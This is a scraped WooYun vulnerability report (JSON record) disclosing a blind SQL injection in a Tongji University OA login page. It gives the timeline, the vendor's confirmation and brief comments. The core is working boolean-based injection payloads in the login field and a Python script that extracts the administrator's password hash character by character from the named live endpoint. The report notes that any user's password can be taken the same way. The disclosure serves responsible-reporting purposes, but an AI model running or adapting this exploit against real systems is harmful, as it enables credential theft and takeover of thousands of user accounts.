{"id": 70657, "wybug_id": "wooyun-2015-0135000", "wybug_title": "同济大学某分站存在SQL注入，导致2W+用户任意登录（附测试脚本）", "wybug_corp": "同济大学", "wybug_author": "浮萍", "wybug_date": "2015-08-18 14:13", "wybug_open_date": "2015-10-02 15:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向公众公开  简要描述： SQL注入21780用户 详细说明：  http://oa.tongji.edu.cn:89\n\n用户名存在的时候提示密码不正确（102）\n\n用户名不存在时提示用户未找到（103）\nsysadmin' and(select(loginid) from hrmresourcemanager)='sysadmin' and'1'='1\nhrmresourcemanager表存在 且sysadmin存在\nsysadmin' and(select count(*) from HrmResource)>0 and'1'='1\n\n\nHrmResource表存在看看多少用户\nsysadmin' and(select count(*) from HrmResource)=21780\n\n\n   漏洞证明：  根据\nsysadmin' and ascii(substr(password,i,1))>57 and'1'='1\n来获取password内容\n\n\n\n这里获取的密码第一位对应的ascii为57  即第一位为9\nimport urllibimport urllib2dic = '0123456789ABCDEF'pwd = ''for i in range(32):\tfor j in dic:\t\tusername = \"sysadmin' and(substr(password,\"+str(i+1)+\",1)='\"+j+\"') and 'a'='a\"\t\t#username = \"sysadmin' and 'a'='a\"\t\tvalues = {'loginid':username,'password':'z','authcode':'','dynapass':'','tokenpass':'','clienttype':'Webclient','clientver':4.5,'language':'','country':'','verify':'','needdyna':''}\t\t#print values\t\tdata = urllib.urlencode(values)\t\treq = urllib2.Request(\"http://oa.tongji.edu.cn:89/verifyLogin.do\",data)\t\tresponse = urllib2.urlopen(req)\t\thtml = response.read()\t\t#print html\t\tfd = html.count('102')\t\t#print '-->'+str(fd)\t\t\t\tif fd>0 :\t\t\tpwd = pwd +j\t\t\tprint pwd\t\t\tbreak\nsysadmin对应的密码为\n\n获取其他用户密码只需将sysadmin替换即可   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-18 15:56 厂商回复： 漏洞确实存存，感谢提醒！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-18 14:35 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  搞我同济是几个意思?    \n     2015-08-18 14:54 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:653 漏洞数:132        | 290)\t\t \n  @BeenQuiver 同济小王子，大哥我错了    \n     2015-08-18 14:57 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  @浮萍 非也非也，同济大学欢迎你。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}